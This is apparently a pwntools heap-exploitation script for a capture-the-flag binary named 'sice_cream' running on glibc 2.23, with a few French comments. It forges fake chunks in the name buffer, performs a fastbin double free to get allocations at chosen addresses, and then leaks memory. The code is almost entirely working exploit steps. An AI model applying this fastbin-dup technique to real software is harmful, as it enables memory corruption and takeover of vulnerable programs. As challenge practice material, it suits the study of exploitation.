import sys, time
from pwn import *
context.log_level = 'error'
p = process(['./ld-2.23.so', '--library-path', '.', './sice_cream'], stderr=process.STDOUT)
FASTBIN_FAKE = 0x602130
UNSORTED_FAKE = 0x602050
def buy(size, data):
    p.recvuntil(b'> '); p.send(b'1\n')
    p.recvuntil(b'> '); p.send(str(size).encode() + b'\n')
    p.recvuntil(b'> '); p.send(data)
    p.recvuntil(b'Here you go!')
def eat(idx):
    p.recvuntil(b'> '); p.send(b'2\n')
    p.recvuntil(b'> '); p.send(str(idx).encode() + b'\n')
    try:
        return p.recvuntil(b'Yum!', timeout=2)
    except EOFError:
        return b''
buf = bytearray(b'A' * 0x100)
buf[0x18:0x20] = p64(0x91)
buf[0x20:0x28] = p64(0)
buf[0xa0:0xa8] = p64(0)
buf[0xa8:0xb0] = p64(0x21)
buf[0xc0:0xc8] = p64(0)
buf[0xc8:0xd0] = p64(0x21)
buf[0xf0:0xf8] = p64(0)
buf[0xf8:0x100] = p64(0x60)
p.recvuntil(b'Whats your name?'); p.recvuntil(b'> '); p.send(bytes(buf))
buy(0x58, b'A' * 0x58); buy(0x58, b'B' * 0x58)
eat(0); eat(1); eat(0)
buy(0x58, p64(FASTBIN_FAKE) + b'C' * (0x58 - 8))
buy(0x58, b'D' * 0x58)
buy(0x58, b'E' * 0x58)
buy(0x58, p64(UNSORTED_FAKE) + p64(0) * 10)
print("pwnlib: creams ecrit")
# verif via reintroduce : 1 octet
p.recvuntil(b'> ')
p.send(b'3\n')
p.recvuntil(b'> ')
p.send(b'Z')
time.sleep(0.4)
leak = p.recvrepeat(0.6)
print("LEAK hex:", leak[:120].hex())
print("LEAK txt:", leak[:120])
# maintenant le free
r = eat(0)
print("eat final:", r)
time.sleep(0.2)
print("RESTE:", p.recvrepeat(0.5)[-300:])
p.close()
